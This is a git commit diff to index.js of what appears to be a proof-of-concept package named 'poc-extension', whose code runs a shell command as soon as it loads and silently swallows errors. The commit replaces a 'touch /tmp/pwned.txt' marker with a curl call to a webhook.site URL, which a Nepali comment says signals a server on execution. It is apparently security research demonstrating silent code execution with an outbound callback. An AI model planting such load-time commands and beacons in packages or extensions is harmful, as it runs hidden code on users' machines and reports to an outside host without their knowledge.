a8707c6062e8b708cd7fec67cea20281fc97f5ef
hackerkritik-prog <hackerkritik@gmail.com>
2026-05-24 18:36:14 +0545

    Update command to send signal via curl
    Replaced touch command with a curl command to send a signal to a server.

--- index.js
+++ index.js
@@ -1,11 +1,10 @@
 const { execSync } = require('child_process');
 
 try {
-  execSync('touch /tmp/pwned.txt');
+  // यो कमाण्डले एक्जिक्युट हुने बित्तिकै सर्भरमा सिग्नल पठाउँछ
+  execSync('curl -I https://webhook.site/7f5fbe42-3cdb-4309-bc8f-73d5109056a0');
 } catch (e) {
   // Silent fail
 }
 
-module.exports = {
-  name: "poc-extension"
-};
+module.exports = { name: "poc-extension" };
